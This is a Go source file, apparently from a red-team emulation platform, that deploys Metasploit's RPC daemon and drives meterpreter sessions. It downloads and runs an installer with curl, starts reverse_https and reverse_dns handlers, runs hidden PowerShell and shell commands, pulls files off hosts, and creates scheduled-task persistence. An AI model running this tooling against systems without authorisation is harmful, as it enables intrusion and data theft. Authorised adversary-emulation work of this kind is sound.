// Package metasploit adapts the Metasploit Framework to RInfra. Orchestrated-tier:
// the msfrpcd RPC daemon lets RInfra start handlers and drive meterpreter sessions
// programmatically. Pairs with the msfvenom payload generator (internal/payload).
//
// # Posture
//
// Deploys and drives the upstream Metasploit release. Implements no payloads,
// modules, or evasion. Open source (Rapid7) — no license key required.
//
// # msfrpcd client
//
// MsfRpcdClient is the minimal interface over the msfrpcd MessagePack-over-HTTP
// RPC protocol. The live implementation (liveClient, metasploit_live.go) issues
// HTTP POSTs to /api/1.0/ with msgpack-encoded calls using the in-house codec
// in msgpack.go. Control() wires it against the deployed teamserver; tests
// inject a fake (metasploit_test.go) or an in-process msfrpcd stand-in
// (metasploit_live_test.go).
package metasploit

import (
	"context"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"github.com/rinfra/rinfra/internal/c2"
	"github.com/rinfra/rinfra/internal/c2/deploy"
	"github.com/rinfra/rinfra/internal/domain"
	"github.com/rinfra/rinfra/internal/emulation/ttp"
	"github.com/rinfra/rinfra/internal/secrets"
)

func init() { c2.Register(&provider{}) }

const (
	// Metasploit ships as the Rapid7 "omnibus" package, installed via the
	// official nightly installer wrapper (msfupdate.erb — Rapid7's documented
	// Linux install command), pinned to a metasploit-omnibus commit. It is
	// downloaded and run in ExtraSetup; it lays down the framework (msfconsole,
	// msfrpcd, msfdb) under /opt/metasploit-framework with /usr/bin symlinks.
	// There is no published checksum for the script, so integrity rests on HTTPS +
	// the pinned commit URL (no placeholder SHA). Verified to return 200.
	msfInstallerURL = "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/66ebcd7c0f0e9ea33f22be102d047e80faf5018d/config/templates/metasploit-framework-wrappers/msfupdate.erb"
	msfRpcdPort     = 55553
)

type provider struct{}

func (p *provider) Name() string         { return "metasploit" }
func (p *provider) Tier() c2.SupportTier { return c2.TierOrchestrated }

// Capabilities reports Metasploit's routing metadata: cross-platform meterpreter
// sessions over HTTPS/TCP.
func (p *provider) Capabilities() c2.Capabilities {
	return c2.Capabilities{
		Platforms:         []string{"windows", "linux", "macos"},
		ListenerProtocols: []string{"https", "tcp"},
	}
}

// Deploy installs the upstream Metasploit Framework on the node via SSH, then
// starts msfrpcd (the RPC daemon) as a systemd service.
func (p *provider) Deploy(ctx context.Context, node domain.Node, cfg c2.Config) (c2.Teamserver, error) {
	runner := deploy.NewNodeRunner(node.PublicIP)
	return deployMSF(ctx, runner, node, cfg)
}

func deployMSF(ctx context.Context, runner deploy.Runner, node domain.Node, _ c2.Config) (c2.Teamserver, error) {
	rpcUser := "msf"
	// Generate a per-engagement msfrpcd RPC password instead of a shared
	// constant: every deployed teamserver gets unique credentials. The value is
	// wrapped in secrets.Redacted so it can never leak into logs or the audit
	// trail; the plaintext is only used to build the remote install command and
	// is written to the node's 0600 /etc/msf/rpc.env, never echoed to stdout.
	rpcPass, err := generateRPCPassword()
	if err != nil {
		return c2.Teamserver{}, fmt.Errorf("metasploit.Deploy: generate RPC password: %w", err)
	}

	extraSetup := []string{
		"export DEBIAN_FRONTEND=noninteractive",
		"apt-get update -y || true",
		"apt-get install -y curl postgresql || true",
		// Run the official Rapid7 omnibus installer (downloaded here, not via the
		// template's binary-download path — it's an installer, not msfrpcd itself).
		fmt.Sprintf("curl -fsSL %s -o /tmp/msfinstall && chmod +x /tmp/msfinstall && /tmp/msfinstall", msfInstallerURL),
		"msfdb init || true",
		// Write the per-engagement RPC password to a 0600 env file (dir 0700)
		// first, then reference it by variable so the plaintext never appears in
		// argv or the script's stdout.
		"install -d -m 0700 /etc/msf",
		"install -m 0600 /dev/null /etc/msf/rpc.env",
		fmt.Sprintf("printf 'MSF_RPC_USER=%%s\\n' %s >> /etc/msf/rpc.env", shellSingleQuote(rpcUser)),
		fmt.Sprintf("printf 'MSF_RPC_PASS=%%s\\n' %s >> /etc/msf/rpc.env", shellSingleQuote(string(rpcPass))),
		"echo '[rinfra-msf] msfrpcd credentials written to /etc/msf/rpc.env; daemon started by systemd'",
	}

	params := deploy.InstallParams{
		// No ReleaseURL: MSF is installed by the omnibus installer in ExtraSetup
		// (it's not a single downloadable binary). The systemd unit runs the
		// installed msfrpcd; there is NO pre-start/pkill dance.
		DestPath:    "/usr/bin/msfrpcd",
		SystemdUnit: "msfrpcd",
		ServiceUser: "root",
		// Load the per-engagement RPC password into the unit's environment so
		// ExecStart's ${MSF_RPC_PASS} expands. Without this the daemon would
		// start with an unset password.
		EnvironmentFile: "/etc/msf/rpc.env",
		ExecStart: fmt.Sprintf(
			"/usr/bin/msfrpcd -P ${MSF_RPC_PASS} -U %s -a 0.0.0.0 -p %d -S",
			rpcUser, msfRpcdPort,
		),
		ExtraSetup: extraSetup,
	}

	if err := deploy.RunInstall(ctx, runner, params); err != nil {
		return c2.Teamserver{}, fmt.Errorf("metasploit.Deploy: %w", err)
	}

	return c2.Teamserver{
		Host:           node.PublicIP,
		Port:           msfRpcdPort,
		Status:         "running",
		ConnectionInfo: fmt.Sprintf("msfrpcd @ %s:%d (msgpack-over-http RPC)", node.PublicIP, msfRpcdPort),
	}, nil
}

// RedirectorConfig emits an nginx reverse-proxy config fronting the meterpreter
// HTTP(S) handler. Reverse-proxy + categorized-domain (NOT CDN fronting).
func (p *provider) RedirectorConfig(prof domain.Profile) (string, error) {
	return msfRedirectorConfig(prof)
}

func msfRedirectorConfig(prof domain.Profile) (string, error) {
	params := deploy.NginxParams{
		UpstreamHost: "127.0.0.1",
		UpstreamPort: 8443, // meterpreter HTTPS handler default
		ServerName:   prof.RewriteHost,
		RewriteHost:  prof.RewriteHost,
		UseHTTPS:     true,
		SSLCert:      "/etc/ssl/rinfra/server.crt",
		SSLKey:       "/etc/ssl/rinfra/server.key",
		PathRules:    prof.PathRules,
		ExtraServerBlock: "# Metasploit meterpreter HTTPS handler reverse proxy.\n" +
			"    # Set proxy_pass upstream to actual MSF handler IP.",
	}
	cfg, err := deploy.BuildNginxConfig(params)
	if err != nil {
		return "", fmt.Errorf("metasploit.RedirectorConfig: %w", err)
	}
	return cfg, nil
}

// Control returns an Orchestrated-tier Operator backed by the live msfrpcd RPC
// client (metasploit_live.go), pointed at the deployed teamserver's RPC
// endpoint. The client authenticates lazily on its first RPC using the
// per-engagement credentials exported via RINFRA_MSF_RPC_USER/PASSWORD (the
// service layer sources these from the secrets store where Deploy persists the
// generated password). Callers that already hold a context+credentials can use
// LiveOperator to authenticate eagerly instead.
func (p *provider) Control(ts c2.Teamserver) (c2.Operator, bool) {
	return NewOperatorWithClient(ts, clientForTeamserver(ts)), true // poll defaults to defaultPoll
}

// MsfRpcdClient is the minimal interface over msfrpcd's MessagePack-over-HTTP
// RPC protocol. Live implementation: POST to /api/1.0/ with msgpack. Tests inject fake.
type MsfRpcdClient interface {
	// Auth authenticates to msfrpcd. Must be called before other methods.
	Auth(ctx context.Context, user, pass string) error
	// ConsoleCreate creates a new Metasploit console and returns its ID.
	ConsoleCreate(ctx context.Context) (string, error)
	// ConsoleWrite sends commands to a console.
	ConsoleWrite(ctx context.Context, consoleID, command string) error
	// ConsoleRead reads pending console output along with the busy flag: busy=true
	// means the console is still executing (more output is coming). Callers poll
	// until busy is false and no new data arrives.
	ConsoleRead(ctx context.Context, consoleID string) (data string, busy bool, err error)
	// SessionList returns active sessions.
	SessionList(ctx context.Context) ([]MsfSession, error)
	// SessionMeterpreterRun dispatches a meterpreter console command (async); the
	// output is retrieved separately via SessionMeterpreterRead.
	SessionMeterpreterRun(ctx context.Context, sessionID, command string) error
	// SessionMeterpreterRead drains the meterpreter output buffer (a snapshot;
	// poll until it stops returning data).
	SessionMeterpreterRead(ctx context.Context, sessionID string) (string, error)
	// SessionShellWrite sends a command to a shell session.
	SessionShellWrite(ctx context.Context, sessionID, command string) error
	// SessionShellRead reads pending output from a shell session (a snapshot; poll
	// until it stops returning data).
	SessionShellRead(ctx context.Context, sessionID string) (string, error)
}

// MsfSession is an active meterpreter/shell session.
type MsfSession struct {
	ID         string
	Type       string // "meterpreter", "shell"
	Info       string
	ViaExploit string
}

// Output-collection tuning. msfrpcd console/session reads are polling snapshots,
// so output is collected by reading repeatedly until it stops.
const (
	defaultPoll   = 300 * time.Millisecond // delay between polls (live)
	drainTimeout  = 20 * time.Second       // overall cap per drain
	maxEmptyReads = 3                      // consecutive empty reads ⇒ done
	maxReads      = 400                    // hard iteration cap (belt-and-suspenders)
)

// Option configures an operator (e.g. the poll interval for tests).
type Option func(*operator)

// WithPoll sets the inter-poll delay used while draining output. Production uses
// the default (defaultPoll); tests pass WithPoll(0) for instant draining against
// a fake.
func WithPoll(d time.Duration) Option { return func(o *operator) { o.poll = d } }

// NewOperatorWithClient returns a Metasploit Operator with the given client
// injected. The poll interval defaults to defaultPoll so EVERY live caller
// (Control, LiveOperator, anything else) drains output correctly without having
// to remember an option; tests pass WithPoll(0) to drain instantly.
func NewOperatorWithClient(ts c2.Teamserver, client MsfRpcdClient, opts ...Option) c2.Operator {
	o := &operator{ts: ts, client: client, poll: defaultPoll}
	for _, opt := range opts {
		opt(o)
	}
	return o
}

type operator struct {
	ts     c2.Teamserver
	client MsfRpcdClient
	poll   time.Duration
}

// nap waits the poll interval (no-op when poll is 0, e.g. in tests), honoring ctx.
func (o *operator) nap(ctx context.Context) {
	if o.poll <= 0 {
		return
	}
	select {
	case <-time.After(o.poll):
	case <-ctx.Done():
	}
}

// drainConsole reads a console until it is idle (not busy and no new output) or
// the timeout elapses, accumulating all output.
func (o *operator) drainConsole(ctx context.Context, cid string) (string, error) {
	var b strings.Builder
	deadline := time.Now().Add(drainTimeout)
	for i := 0; i < maxReads && time.Now().Before(deadline); i++ {
		data, busy, err := o.client.ConsoleRead(ctx, cid)
		if err != nil {
			return b.String(), err
		}
		b.WriteString(data)
		if !busy && data == "" {
			break
		}
		o.nap(ctx)
	}
	return b.String(), nil
}

// drainReads polls a session read function until output stops (maxEmptyReads
// consecutive empty reads) or the timeout elapses, accumulating all output.
func (o *operator) drainReads(ctx context.Context, read func(context.Context) (string, error)) (string, error) {
	var b strings.Builder
	empty := 0
	deadline := time.Now().Add(drainTimeout)
	for i := 0; i < maxReads && time.Now().Before(deadline); i++ {
		data, err := read(ctx)
		if err != nil {
			return b.String(), err
		}
		if data == "" {
			if empty++; empty >= maxEmptyReads {
				break
			}
		} else {
			empty = 0
			b.WriteString(data)
		}
		o.nap(ctx)
	}
	return b.String(), nil
}

// sessionIsMeterpreter reports whether the session is a meterpreter session
// (vs a raw shell). Unknown/missing sessions default to meterpreter, since the
// renderer emits meterpreter console commands. A SessionList error also defaults
// to meterpreter rather than failing the technique.
func (o *operator) sessionIsMeterpreter(ctx context.Context, sessionID string) bool {
	sessions, err := o.client.SessionList(ctx)
	if err != nil {
		return true
	}
	for _, s := range sessions {
		if s.ID == sessionID {
			return !strings.EqualFold(s.Type, "shell")
		}
	}
	return true
}

// runOnSession dispatches a rendered command to a session by type and drains its
// output: meterpreter via run_single + meterpreter_read, raw shell via
// shell_write + shell_read.
func (o *operator) runOnSession(ctx context.Context, sessionID, cmd string) (string, error) {
	if o.sessionIsMeterpreter(ctx, sessionID) {
		if err := o.client.SessionMeterpreterRun(ctx, sessionID, cmd); err != nil {
			return "", err
		}
		return o.drainReads(ctx, func(ctx context.Context) (string, error) {
			return o.client.SessionMeterpreterRead(ctx, sessionID)
		})
	}
	if err := o.client.SessionShellWrite(ctx, sessionID, cmd+"\n"); err != nil {
		return "", err
	}
	return o.drainReads(ctx, func(ctx context.Context) (string, error) {
		return o.client.SessionShellRead(ctx, sessionID)
	})
}

func (o *operator) StartListener(ctx context.Context, spec c2.ListenerSpec) error {
	// Start a multi/handler listener via msfrpcd console.
	cid, err := o.client.ConsoleCreate(ctx)
	if err != nil {
		return fmt.Errorf("metasploit: create console: %w", err)
	}

	payload := msfPayloadForProtocol(spec.Protocol)
	lport := 443
	if spec.Protocol == "dns" {
		lport = 53
	}

	cmds := []string{
		"use exploit/multi/handler",
		fmt.Sprintf("set PAYLOAD %s", payload),
		fmt.Sprintf("set LHOST %s", spec.Bind),
		fmt.Sprintf("set LPORT %d", lport),
		"exploit -j",
	}

	for _, cmd := range cmds {
		if err := o.client.ConsoleWrite(ctx, cid, cmd+"\n"); err != nil {
			return fmt.Errorf("metasploit: console write (%q): %w", cmd, err)
		}
		// Drain to completion: console.read is a polling snapshot with a busy
		// flag — a single read would return partial/empty output and we'd never
		// know the handler actually started.
		if _, err := o.drainConsole(ctx, cid); err != nil {
			return fmt.Errorf("metasploit: console read (%q): %w", cmd, err)
		}
	}
	return nil
}

func (o *operator) Sessions(ctx context.Context) ([]c2.Session, error) {
	raw, err := o.client.SessionList(ctx)
	if err != nil {
		return nil, fmt.Errorf("metasploit: sessions: %w", err)
	}
	out := make([]c2.Session, 0, len(raw))
	for _, s := range raw {
		out = append(out, c2.Session{
			ID:   s.ID,
			Host: s.Info,
			Metadata: map[string]string{
				"type":        s.Type,
				"via_exploit": s.ViaExploit,
			},
		})
	}
	return out, nil
}

// Execute translates a portable domain.Technique into msfrpcd console commands.
// No payload bytes are authored; the SourceID references a public library procedure.
func (o *operator) Execute(ctx context.Context, sessionID string, t domain.Technique) (domain.Result, error) {
	start := time.Now()

	cmd, err := techniqueToMsfCommand(t)
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecUnsupported,
			Output:            err.Error(),
			StartedAt:         start,
			FinishedAt:        time.Now(),
		}, nil
	}

	output, err := o.runOnSession(ctx, sessionID, cmd)
	fin := time.Now()
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			Output:            deploy.Sanitize(output),
			StartedAt:         start,
			FinishedAt:        fin,
			Err:               err.Error(),
		}, nil
	}

	return domain.Result{
		TechniqueAttackID: t.AttackID,
		Status:            domain.ExecSuccess,
		Output:            deploy.Sanitize(output),
		StartedAt:         start,
		FinishedAt:        fin,
	}, nil
}

// techniqueToMsfCommand compiles a portable Technique to a meterpreter/shell
// command: ttp.Compile resolves the technique to a portable primitive (the
// shared catalog), and renderMsfPrimitive renders it to Metasploit's native
// console syntax. The SourceID references the Atomic Red Team test or Caldera
// ability — no payload content is authored here.
func techniqueToMsfCommand(t domain.Technique) (string, error) {
	prim, ok, err := ttp.Compile(t)
	if err != nil {
		return "", err
	}
	if !ok {
		return "", fmt.Errorf("metasploit: no catalog mapping for technique %s (source: %s id: %s)",
			t.AttackID, t.Source, t.SourceID)
	}
	return renderMsfPrimitive(prim)
}

// Revert undoes a persistence technique Metasploit created (deletes the
// scheduled task via the session shell). Implements c2.Reverter.
func (o *operator) Revert(ctx context.Context, sessionID string, t domain.Technique) (domain.Result, error) {
	start := time.Now()
	cmd, ok := msfCleanupCommand(t)
	if !ok {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecUnsupported,
			Output:            "metasploit: no cleanup defined for this technique",
			StartedAt:         start,
			FinishedAt:        time.Now(),
		}, nil
	}
	output, err := o.runOnSession(ctx, sessionID, cmd)
	fin := time.Now()
	if err != nil {
		return domain.Result{
			TechniqueAttackID: t.AttackID,
			Status:            domain.ExecFailed,
			Output:            deploy.Sanitize(output),
			StartedAt:         start,
			FinishedAt:        fin,
			Err:               err.Error(),
		}, nil
	}
	return domain.Result{
		TechniqueAttackID: t.AttackID,
		Status:            domain.ExecSuccess,
		Output:            deploy.Sanitize(output),
		StartedAt:         start,
		FinishedAt:        fin,
	}, nil
}

// msfCleanupCommand renders the reverse of a persistence primitive Metasploit
// supports. ok=false when the technique has no catalog mapping or no cleanup.
func msfCleanupCommand(t domain.Technique) (string, bool) {
	prim, ok, err := ttp.Compile(t)
	if err != nil || !ok {
		return "", false
	}
	if prim.Kind == c2.PrimScheduledTask {
		return fmt.Sprintf(`shell schtasks /delete /tn "%s" /f`, prim.Arg("task_name")), true
	}
	return "", false
}

// renderMsfPrimitive renders a portable primitive into a meterpreter/shell
// command. Primitives Metasploit does not implement (e.g. a registry Run-key
// write) return an error so the caller records the technique unsupported.
func renderMsfPrimitive(p c2.Primitive) (string, error) {
	switch p.Kind {
	case c2.PrimPowerShell:
		return fmt.Sprintf("execute -f powershell.exe -a '-c \"%s\"' -H", p.Arg("script")), nil
	case c2.PrimShell:
		return fmt.Sprintf("shell cmd /c \"%s\"", p.Arg("command")), nil
	case c2.PrimSysInfo:
		return "sysinfo", nil
	case c2.PrimProcessList:
		return "ps", nil
	case c2.PrimNetConnections:
		return "netstat", nil
	case c2.PrimNetConfig:
		return "ipconfig", nil
	case c2.PrimFileList:
		path := p.Arg("path")
		if path == "" {
			path = "C:\\"
		}
		return fmt.Sprintf("ls \"%s\"", path), nil
	case c2.PrimDownload:
		return fmt.Sprintf("download \"%s\"", p.Arg("path")), nil
	case c2.PrimScheduledTask:
		return fmt.Sprintf(`shell schtasks /create /tn "%s" /tr whoami /sc once /st 00:00`, p.Arg("task_name")), nil
	default:
		if cmd, ok := c2.DiscoveryCommand(p.Kind); ok {
			return fmt.Sprintf("shell cmd /c \"%s\"", cmd), nil
		}
		return "", fmt.Errorf("metasploit: unsupported primitive %q", p.Kind)
	}
}

func msfPayloadForProtocol(protocol string) string {
	switch strings.ToLower(protocol) {
	case "https":
		return "windows/x64/meterpreter/reverse_https"
	case "http":
		return "windows/x64/meterpreter/reverse_http"
	case "dns":
		return "windows/x64/meterpreter/reverse_dns"
	default:
		return "windows/x64/meterpreter/reverse_https"
	}
}

// generateRPCPassword returns a per-engagement msfrpcd RPC password as 32 hex
// chars of cryptographically random entropy, wrapped in secrets.Redacted so it
// is never captured by logs or the audit trail.
func generateRPCPassword() (secrets.Redacted, error) {
	buf := make([]byte, 16)
	if _, err := rand.Read(buf); err != nil {
		return "", fmt.Errorf("read random: %w", err)
	}
	return secrets.Redacted(hex.EncodeToString(buf)), nil
}

// shellSingleQuote single-quotes s for safe use as a shell argument.
func shellSingleQuote(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
